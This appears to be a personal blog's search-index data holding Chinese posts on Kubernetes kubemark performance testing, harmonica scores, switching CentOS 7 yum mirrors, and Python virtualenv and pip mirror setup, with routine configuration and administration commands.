name:logs-volumemountPath:/var/logresources:requests:cpu:20mmemory:50Mtolerations:- effect:NoExecutekey:node.kubernetes.io/unreachableoperator:Exists- effect:NoExecutekey:node.kubernetes.io/not-readyoperator:Existsaffinity:nodeAffinity:requiredDuringSchedulingIgnoredDuringExecution:# 硬策略nodeSelectorTerms:- matchExpressions:- key:nameoperator:NotInvalues:- hollow-node- key:node-role.kubernetes.io/masteroperator:NotInvalues:- \"true\" 由上可知，hollow-node实际上是启动过了kubelet和proxy的2个进程，后来分析源码确实如此。 写个测试pod，验证桩node是否可用，test-pod.yaml如下 apiVersion:v1kind:Podmetadata:name:myapp-podlabels:app:myappversion:v1spec:containers:- name:appimage:docker.io/busybox:latestimagePullPolicy:IfNotPresentcommand:['sleep','3600']securityContext:privileged:trueaffinity:nodeAffinity:requiredDuringSchedulingIgnoredDuringExecution:# 硬策略nodeSelectorTerms:- matchExpressions:- key:node-role.kubernetes.io/nodeoperator:NotInvalues:- \"true\" 节点信息 hollow-node-0, 此信息为默认信息 Name: hollow-node-0 Roles: \u003cnone\u003e Labels: beta.kubernetes.io/arch=amd64 beta.kubernetes.io/os=linux kubernetes.io/arch=amd64 kubernetes.io/hostname=hollow-node-0 kubernetes.io/os=linux Annotations: node.alpha.kubernetes.io/ttl: 0 CreationTimestamp: Mon, 07 Dec 2020 17:25:15 +0800 Taints: \u003cnone\u003e Unschedulable: false Conditions: Type Status LastHeartbeatTime LastTransitionTime Reason Message ---- ------ ----------------- ------------------ ------ ------- MemoryPressure False Tue, 08 Dec 2020 09:37:21 +0800 Mon, 07 Dec 2020 17:25:15 +0800 KubeletHasSufficientMemory kubelet has sufficient memory available DiskPressure False Tue, 08 Dec 2020 09:37:21 +0800 Mon, 07 Dec 2020 17:25:15 +0800 KubeletHasNoDiskPressure kubelet has no disk pressure PIDPressure False Tue, 08 Dec 2020 09:37:21 +0800 Mon, 07 Dec 2020 17:25:15 +0800 KubeletHasSufficientPID kubelet has sufficient PID available Ready True Tue, 08 Dec 2020 09:37:21 +0800 Mon, 07 Dec 2020 17:25:15 +0800 KubeletReady kubelet is posting ready status Addresses: InternalIP: 10.233.96.39 Hostname: hollow-node-0 Capacity: cpu: 1 ephemeral-storage: 0 memory: 3840Mi pods: 110 Allocatable: cpu: 1 ","date":"2020-12-08","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/:2:4","tags":["K8S"],"title":"K8S集群性能测试-kubemark","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/"},{"categories":["K8S"],"content":"kubemark源码 程序入口 kubemark根据参数Morph，可执行kubelet和proxy流程，从而实现节点组件功能。 cmd/kubemark/hollow-node.go func run(config *hollowNodeConfig) { if !knownMorphs.Has(config.Morph) { klog.Fatalf(\"Unknown morph: %v. Allowed values: %v\", config.Morph, knownMorphs.List()) } // create a client to communicate with API server. clientConfig, err := config.createClientConfigFromFile() if err != nil { klog.Fatalf(\"Failed to create a ClientConfig: %v. Exiting.\", err) } client, err := clientset.NewForConfig(clientConfig) if err != nil { klog.Fatalf(\"Failed to create a ClientSet: %v. Exiting.\", err) } if config.Morph == \"kubelet\" { cadvisorInterface := \u0026cadvisortest.Fake{ NodeName: config.NodeName, } containerManager := cm.NewStubContainerManager() fakeDockerClientConfig := \u0026dockershim.ClientConfig{ DockerEndpoint: libdocker.FakeDockerEndpoint, EnableSleep: true, WithTraceDisabled: true, } hollowKubelet := kubemark.NewHollowKubelet( config.NodeName, client, cadvisorInterface, fakeDockerClientConfig, config.KubeletPort, config.KubeletReadOnlyPort, containerManager, maxPods, podsPerCore, ) hollowKubelet.Run() } if config.Morph == \"proxy\" { client, err := clientset.NewForConfig(clientConfig) if err != nil { klog.Fatalf(\"Failed to create API Server client: %v\", err) } iptInterface := fakeiptables.NewFake() sysctl := fakesysctl.NewFake() execer := \u0026fakeexec.FakeExec{} eventBroadcaster := record.NewBroadcaster() recorder := eventBroadcaster.NewRecorder(legacyscheme.Scheme, v1.EventSource{Component: \"kube-proxy\", Host: config.NodeName}) hollowProxy, err := kubemark.NewHollowProxyOrDie( config.NodeName, client, client.CoreV1(), iptInterface, sysctl, execer, eventBroadcaster, recorder, config.UseRealProxier, config.ProxierSyncPeriod, config.ProxierMinSyncPeriod, ) if err != nil { klog.Fatalf(\"Failed to create hollowProxy instance: %v\", err) } hollowProxy.Run() } } hollow_kubelet pkg/kubemark/hollow_kubelet type HollowKubelet struct { KubeletFlags *options.KubeletFlags KubeletConfiguration *kubeletconfig.KubeletConfiguration KubeletDeps *kubelet.Dependencies } func NewHollowKubelet( nodeName string, client *clientset.Clientset, cadvisorInterface cadvisor.Interface, dockerClientConfig *dockershim.ClientConfig, kubeletPort, kubeletReadOnlyPort int, containerManager cm.ContainerManager, maxPods int, podsPerCore int, ) *HollowKubelet { // ----------------- // Static config // ----------------- f, c := GetHollowKubeletConfig(nodeName, kubeletPort, kubeletReadOnlyPort, maxPods, podsPerCore) // ----------------- // Injected objects // ----------------- volumePlugins := emptydir.ProbeVolumePlugins() volumePlugins = append(volumePlugins, secret.ProbeVolumePlugins()...) volumePlugins = append(volumePlugins, projected.ProbeVolumePlugins()...) d := \u0026kubelet.Dependencies{ KubeClient: client, HeartbeatClient: client, DockerClientConfig: dockerClientConfig, CAdvisorInterface: cadvisorInterface, Cloud: nil, OSInterface: \u0026containertest.FakeOS{}, ContainerManager: containerManager, VolumePlugins: volumePlugins, TLSOptions: nil, OOMAdjuster: oom.NewFakeOOMAdjuster(), Mounter: mount.New(\"\" /* default mount path */), Subpather: \u0026subpath.FakeSubpath{}, } return \u0026HollowKubelet{ KubeletFlags: f, KubeletConfiguration: c, KubeletDeps: d, } } // Starts this HollowKubelet and blocks. func (hk *HollowKubelet) Run() { if err := kubeletapp.RunKubelet(\u0026options.KubeletServer{ KubeletFlags: *hk.KubeletFlags, KubeletConfiguration: *hk.KubeletConfiguration, }, hk.KubeletDeps, false); err != nil { klog.Fatalf(\"Failed to run HollowKubelet: %v. Exiting.\", err) } select {} } hollow_proxy pkg/kubemark/hollow_proxy type HollowProxy struct { ProxyServer *proxyapp.ProxyServer } type FakeProxier struct{} func (*FakeProxier) Sync() {} func (*FakeProxier) SyncLoop() { select {} } func (*FakeProxier) OnServiceAdd(service *v1.Service) {} func (*FakeProxier) OnServiceUpdate(oldService, service *v1.Service) {} func (*FakeProxier) OnServiceDelete(service *v1.Service) {} func (*FakeProxier) OnServiceSynced() {} func ","date":"2020-12-08","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/:2:5","tags":["K8S"],"title":"K8S集群性能测试-kubemark","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/"},{"categories":["K8S"],"content":"kubemark总结 kubemark实际上是个K8S组件，包含了kubelet和一个controller，模拟桩节点主要使用了kubelet功能。 kubemark通过在真实节点上构造批量的hollow-node的pod方式，模拟运行了大量的桩节点。这些桩节点可以定时跟master同步状态和信息。 kubemark一般用于测试master节点上的组件的性能测试，比如测试调度器和控制器组件性能。 kubemark由于其构造方式，决定其不能测试node节点组件，比如kubelet性能和网络等。 ","date":"2020-12-08","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/:2:6","tags":["K8S"],"title":"K8S集群性能测试-kubemark","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/"},{"categories":["K8S"],"content":"3 测试框架 可参考k8s的perf-test Kubernetes测试系列 - 性能测试 kubernetes性能指标体系：clusterloader2 clusterloader2的漫漫踩坑路：最详细解析与使用指南 clusterloader2设计说明：Cluster loader vision ","date":"2020-12-08","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/:3:0","tags":["K8S"],"title":"K8S集群性能测试-kubemark","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/"},{"categories":["K8S"],"content":"4 问题 ","date":"2020-12-08","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/:4:0","tags":["K8S"],"title":"K8S集群性能测试-kubemark","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/"},{"categories":["K8S"],"content":"kubemark的hollow node 启动后，报错： 此时node状态为为not ready I0223 04:37:53.577861 6 kubelet_node_status.go:468] Recording NodeHasSufficientPID event message for node hollow-node-1 I0223 04:37:53.577871 6 kubelet_node_status.go:468] Recording NodeNotReady event message for node hollow-node-1 I0223 04:37:53.577879 6 setters.go:526] Node became not ready: {Type:Ready Status:False LastHeartbeatTime:2021-02-23 04:37:53.577865902 +0000 UTC m=+46.268886946 LastTransitionTime:2021-02-23 04:37:53.577865902 +0000 UTC m=+46.268886946 Reason:KubeletNotReady Message:Missing node capacity for resources: pods} I0223 04:37:53.640378 6 reconciler.go:154] Reconciler: start to sync state 编译kubemark时，需要设置nodesstatus的maxpods数量 v1.ResourcePods: *resource.NewQuantity(maxpods, resource.DecimalSI) ","date":"2020-12-08","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/:4:1","tags":["K8S"],"title":"K8S集群性能测试-kubemark","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/"},{"categories":["K8S"],"content":"如果启动kubemark的hollow node 状态为not ready，查看log报错信息 E0223 06:15:30.382797 6 reflector.go:126] k8s.io/kubernetes/pkg/kubelet/config/apiserver.go:47: Failed to list *v1.Pod: Get \"https://192.168.182.101:6443/api/v1/pods?fieldSelector=spec.nodeName%3Dhollow-node-0\u0026limit=500\u0026resourceVersion=0\": dial tcp 192.168.182.101:6443: i/o timeout I0223 06:15:30.383089 6 trace.go:81] Trace[432657393]: \"Reflector k8s.io/kubernetes/pkg/kubelet/kubelet.go:451 ListAndWatch\" (started: 2021-02-23 06:15:00.377839254 +0000 UTC m=+0.144897671) (total time: 30.005174003s): Trace[432657393]: [30.005174003s] [30.005174003s] END E0223 06:15:30.383123 6 reflector.go:126] k8s.io/kubernetes/pkg/kubelet/kubelet.go:451: Failed to list *v1.Node: Get \"https://192.168.182.101:6443/api/v1/nodes?fieldSelector=metadata.name%3Dhollow-node-0\u0026limit=500\u0026resourceVersion=0\": dial tcp 192.168.182.101:6443: i/o timeout E0223 06:15:30.402640 6 kubelet.go:2246] node \"hollow-node-0\" not found E0223 06:15:30.502860 6 kubelet.go:2246] node \"hollow-node-0\" not found 此时可能为网络原因，停止kubelet和docker服务，清理下网络即可解决 ","date":"2020-12-08","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/:4:2","tags":["K8S"],"title":"K8S集群性能测试-kubemark","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/"},{"categories":["K8S"],"content":"5 附录 参考操作命令。。。 [root@test-master ~]# kubectl get secret -A |grep kubeconfig kubemark kubeconfig Opaque 2 94s [root@test-master ~]# kubectl describe secret -nkubemark kubeconfig Name: kubeconfig Namespace: kubemark Labels: \u003cnone\u003e Annotations: \u003cnone\u003e Type: Opaque Data ==== kubelet.kubeconfig: 5463 bytes kubeproxy.kubeconfig: 5463 bytes #### 如果要删除刚刚创建的secret和 configmap kubectl delete secret -nkubemark kubeconfig kubectl delete configmap -n kubemark node-configmap kubectl delete ns kubemark --force --grace-period=0 #### 强制删除资源 kubectl delete po --force --grace-period=0 -nkube-system kube-proxy-p6k42 ### 删除kubemark命名空间下所有node资源 kubectl delete no --all -n kubemark #### 设置master节点不可调度 # kubectl cordon nodename kubectl cordon node1 # kubectl uncordon nodename #取消 #### 节点打标签 kubectl label node node1 accessswitch=switch1 kubectl label node node1 groupId=defaultGroup kubectl label node node1 node-role.kubernetes.io/master=true kubectl label node node1 node-role.kubernetes.io/node=true kubectl label node node1 switchtype=ether kubectl label node node2 accessswitch=switch1 kubectl label node node2 groupId=defaultGroup kubectl label node node2 node-role.kubernetes.io/node=true kubectl label node node2 switchtype=ether 修改hollow-node信息，不是node的全部信息都可以修改更新，如capacity等字段无法更新 kubectl patch node hollow-node-0 -p '{\"spec\":{\"unschedulable\":true}}' e2e测试 编译e2e.test make WHAT=“test/e2e/e2e.test” # 进入k8s项目，进行测试工具编译 make WHAT=\"test/e2e/e2e.test\" # 在目录下能够看到输出文件如下： [root@node1 k8s1.14.8modify-wangb]# ll _output/bin/ -h total 241M -rwxr-xr-x. 1 root root 5.9M Dec 7 10:04 conversion-gen -rwxr-xr-x. 1 root root 5.9M Dec 7 10:04 deepcopy-gen -rwxr-xr-x. 1 root root 5.9M Dec 7 10:04 defaulter-gen -rwxr-xr-x. 1 root root 110M Dec 7 17:01 e2e.test -rwxr-xr-x. 1 root root 3.5M Dec 7 10:04 go2make -rwxr-xr-x. 1 root root 2.0M Dec 7 10:04 go-bindata -rwxr-xr-x. 1 root root 99M Dec 7 10:05 kubemark -rwxr-xr-x. 1 root root 10M Dec 7 10:04 openapi-gen # 把 e2e.test 文件拷贝到测试集群的master节点上 需要注意：网上的搜到的文章大多数都是编译e2e的二进制文件直接运行 #./e2e.test --kube-master=192.168.182.101 --host=https://192.168.182.101:6443 --ginkgo.focus=\"\\[Performance\\]\" --provider=local --kubeconfig=kubemark.kubeconfig --num-nodes=10 --v=3 --ginkgo.failFast --e2e-output-dir=. --report-dir=. ./e2e.test --kube-master=192.168.182.101 --host=https://192.168.182.101:6443 --ginkgo.focus=\"\\[Performance\\]\" --provider=local --kubeconfig=/root/.kube/config --num-nodes=4 --v=3 --ginkgo.failFast --e2e-output-dir=. --report-dir=. 但其实e2e的性能用例已经被移出主库了 https://github.com/kubernetes/kubernetes/pull/83322，所以在2019.10.1之后出的版本用上面的命令是无法运行性能测试的 Deployment中pod创建的流程 apiserver收到创建deployment的请求，存储至etcd，告知controller-manager controller-manager创建pod的壳子，打上creationTimeStamp，发送请求到apiserver apiserver收到创建pod的请求，发送至etcd，推送到scheduler。 schduler选择node，填充nodeName，向apiserver更新pod信息。此时pod处于pending状态，pod也没有真正创建。 apiserver向etcd更新pod信息，同时推送到相应节点的kubelet kubelet创建pod，填充HostIP与resourceVersion，向apiserver发送更新请求，pod处于pending状态 apiserver更新pod信息至etcd，同时kubelet继续创建pod。等到容器都处于running状态，kubelet再次发送pod的更新请求给apiserver，此时pod running apiserver收到请求，更新到etcd中，并推送到informer中，informer记录下watchPhase ","date":"2020-12-08","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/:5:0","tags":["K8S"],"title":"K8S集群性能测试-kubemark","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/"},{"categories":["音乐"],"content":"收集了一些经典好吹的口琴谱子，【持续更新。。。】","date":"2018-09-26","objectID":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/","tags":["音乐","口琴"],"title":"口琴简谱集","uri":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/"},{"categories":["音乐"],"content":"收集了一些经典好吹的口琴谱子，【持续更新。。。】 ","date":"2018-09-26","objectID":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/:0:0","tags":["音乐","口琴"],"title":"口琴简谱集","uri":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/"},{"categories":["音乐"],"content":"布鲁斯口琴C调第1把位音阶图 ","date":"2018-09-26","objectID":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/:1:0","tags":["音乐","口琴"],"title":"口琴简谱集","uri":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/"},{"categories":["音乐"],"content":"送别 ","date":"2018-09-26","objectID":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/:2:0","tags":["音乐","口琴"],"title":"口琴简谱集","uri":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/"},{"categories":["音乐"],"content":"爱尔兰画眉 ","date":"2018-09-26","objectID":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/:3:0","tags":["音乐","口琴"],"title":"口琴简谱集","uri":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/"},{"categories":["音乐"],"content":"天空之城 ","date":"2018-09-26","objectID":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/:4:0","tags":["音乐","口琴"],"title":"口琴简谱集","uri":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/"},{"categories":["音乐"],"content":"星之所在 ","date":"2018-09-26","objectID":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/:5:0","tags":["音乐","口琴"],"title":"口琴简谱集","uri":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/"},{"categories":["音乐"],"content":"追梦人 ","date":"2018-09-26","objectID":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/:6:0","tags":["音乐","口琴"],"title":"口琴简谱集","uri":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/"},{"categories":["音乐"],"content":"平凡之路 ","date":"2018-09-26","objectID":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/:7:0","tags":["音乐","口琴"],"title":"口琴简谱集","uri":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/"},{"categories":["音乐"],"content":"喀秋莎 ","date":"2018-09-26","objectID":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/:8:0","tags":["音乐","口琴"],"title":"口琴简谱集","uri":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/"},{"categories":["音乐"],"content":"三套车 ","date":"2018-09-26","objectID":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/:9:0","tags":["音乐","口琴"],"title":"口琴简谱集","uri":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/"},{"categories":["音乐"],"content":"啊，朋友再见 ","date":"2018-09-26","objectID":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/:10:0","tags":["音乐","口琴"],"title":"口琴简谱集","uri":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/"},{"categories":["音乐"],"content":"The girl I left behind me 演奏视频地址 ","date":"2018-09-26","objectID":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/:11:0","tags":["音乐","口琴"],"title":"口琴简谱集","uri":"/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/"},{"categories":["Linux"],"content":" 配置国内阿里yum源 ","date":"2017-06-26","objectID":"/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/:0:0","tags":["Linux"],"title":"centos7切换国内yum源","uri":"/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/"},{"categories":["Linux"],"content":"yum源配置步骤 根据官网的说明，分别有 CentOS 6、CentOS 7、CentOS 8等配置操作步骤。 ","date":"2017-06-26","objectID":"/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/:1:0","tags":["Linux"],"title":"centos7切换国内yum源","uri":"/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/"},{"categories":["Linux"],"content":"1. 备份操作 备份，将 CentOS-Base.repo 为CentOS-Base.repo.backup mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup ","date":"2017-06-26","objectID":"/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/:1:1","tags":["Linux"],"title":"centos7切换国内yum源","uri":"/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/"},{"categories":["Linux"],"content":"2. 下载yum源配置文件 下载新的 http://mirrors.aliyun.com/repo/Centos-7.repo，并命名为CentOS-Base.repo wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo 或者 curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo ","date":"2017-06-26","objectID":"/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/:1:2","tags":["Linux"],"title":"centos7切换国内yum源","uri":"/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/"},{"categories":["Linux"],"content":"3. 清除缓存 # 清除系统所有的yum缓存 yum clean all # 生成yum缓存 yum makecache ","date":"2017-06-26","objectID":"/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/:1:3","tags":["Linux"],"title":"centos7切换国内yum源","uri":"/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/"},{"categories":["Linux"],"content":"epel源 安装和配置 ","date":"2017-06-26","objectID":"/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/:2:0","tags":["Linux"],"title":"centos7切换国内yum源","uri":"/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/"},{"categories":["Linux"],"content":"1. 查看可用的epel源 yum list | grep epel-release 示例： [java@localhost yum.repos.d]$ yum list | grep epel-release epel-release.noarch 7-11 extras [java@localhost yum.repos.d]$ ","date":"2017-06-26","objectID":"/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/:2:1","tags":["Linux"],"title":"centos7切换国内yum源","uri":"/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/"},{"categories":["Linux"],"content":"2. 安装 epel yum install -y epel-release ","date":"2017-06-26","objectID":"/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/:2:2","tags":["Linux"],"title":"centos7切换国内yum源","uri":"/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/"},{"categories":["Linux"],"content":"3. 配置阿里镜像提供的epel源 wget -O /etc/yum.repos.d/epel-7.repo http://mirrors.aliyun.com/repo/epel-7.repo 或者 curl -o /etc/yum.repos.d/epel-7.repo http://mirrors.aliyun.com/repo/epel-7.repo ","date":"2017-06-26","objectID":"/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/:2:3","tags":["Linux"],"title":"centos7切换国内yum源","uri":"/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/"},{"categories":["Linux"],"content":"4. 清除缓存 # 清除系统所有的yum缓存 yum clean all # 生成yum缓存 yum makecache ","date":"2017-06-26","objectID":"/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/:2:4","tags":["Linux"],"title":"centos7切换国内yum源","uri":"/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/"},{"categories":["Linux"],"content":"5. 其它命令 #查看所有的yum源： yum repolist all #查看可用的yum源： yum repolist enabled ","date":"2017-06-26","objectID":"/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/:2:5","tags":["Linux"],"title":"centos7切换国内yum源","uri":"/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/"},{"categories":["Python"],"content":" 用 virtualenv 来管理多个开发环境，virtualenvwrapper 使得virtualenv变得更好用 ","date":"2017-04-28","objectID":"/posts/2017/04/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:0:0","tags":["Python"],"title":"Python虚拟环境搭建","uri":"/posts/2017/04/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Python"],"content":"python虚拟环境搭建 # 安装虚拟环境 pip install virtualenv ","date":"2017-04-28","objectID":"/posts/2017/04/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:1:0","tags":["Python"],"title":"Python虚拟环境搭建","uri":"/posts/2017/04/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Python"],"content":"安装配置 安装: (sudo) pip install virtualenv virtualenvwrapper Linux/Mac OSX 下： 修改~/.bash_profile或其它环境变量相关文件(如 .bashrc 或用 ZSH 之后的 .zshrc)，添加以下语句 export WORKON_HOME=$HOME/.virtualenvs export PROJECT_HOME=$HOME/workspace source /usr/local/bin/virtualenvwrapper.sh #修改后使之立即生效(也可以重启终端使之生效)： source ~/.bash_profile Windows 下： pip install virtualenvwrapper-win 1.设置环境变量 设置WORK_HOME环境变量：例如，WORK_HOME ： D:\\virtualenv 2.新建虚拟环境 mkvirtualenv virtualtest 注：因为前一步设置了WORK_HOME，所有虚拟环境将安装到 E:\\virtualenv 3.查看安装的所有虚拟环境 workon 使用方法： mkvirtualenv env_test：创建运行环境env_test workon env_test: 工作在 env_test 环境 或 从其它环境切换到 env_test 环境 deactivate: 退出终端环境 其它的： rmvirtualenv ENV：删除运行环境ENV mkproject mic：创建mic项目和运行环境mic mktmpenv：创建临时运行环境 lsvirtualenv: 列出可用的运行环境 lssitepackages: 列出当前环境安装了的包 创建的环境是独立的，互不干扰 列出所有虚拟环境 lsvirtualenv 激活虚拟环境 workon venv 进入虚拟环境目录 cdvirtualenv 进入虚拟环境的site-packages目录 cdsitepackages 列出site-packages目录的所有软件包 lssitepackages 停止虚拟环境 deactivate 删除虚拟环境 rmvitualenv venv ","date":"2017-04-28","objectID":"/posts/2017/04/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:1:1","tags":["Python"],"title":"Python虚拟环境搭建","uri":"/posts/2017/04/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Python"],"content":"重建Python环境 冻结环境 所谓 冻结(freeze) 环境，就是将当前环境的软件包等固定下来: # 安装包列表保存到文件packages.txt中 pip freeze \u003ed:\\packages.txt　 重建环境 重建(rebuild) 环境就是在部署的时候，在生产环境安装好对应版本的软件包，不要出现版本兼容等问题: pip install -r d:\\packages.txt # 配合pip，可以批量安装对应版本的软件包，快速重建环境，完成部署。 ","date":"2017-04-28","objectID":"/posts/2017/04/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:1:2","tags":["Python"],"title":"Python虚拟环境搭建","uri":"/posts/2017/04/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Python"],"content":"PIP安装：更换安装源，使用国内镜像。 对于Python开发用户来讲，经常使用PIP安装软件包。但是由于PIP默认安装源是在国外，经常出现下载后安装出错问题。所以把PIP安装源替换成国内镜像，可以大幅提升下载速度，还可以提高安装成功率。 国内源： 新版ubuntu要求使用https源，要注意。 清华：https://pypi.tuna.tsinghua.edu.cn/simple 阿里云：http://mirrors.aliyun.com/pypi/simple/ 中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/ 华中理工大学：http://pypi.hustunique.com/ 山东理工大学：http://pypi.sdutlinux.org/  豆瓣：http://pypi.douban.com/simple/ 临时使用： 可以在使用pip的时候加参数-i http://pypi.douban.com/simple/ 例如：pip install -i http://pypi.douban.com/simple/ django，这样就会从豆瓣这边的镜像去安装django库。   永久修改，一劳永逸： Linux下，修改 ~/.pip/pip.conf 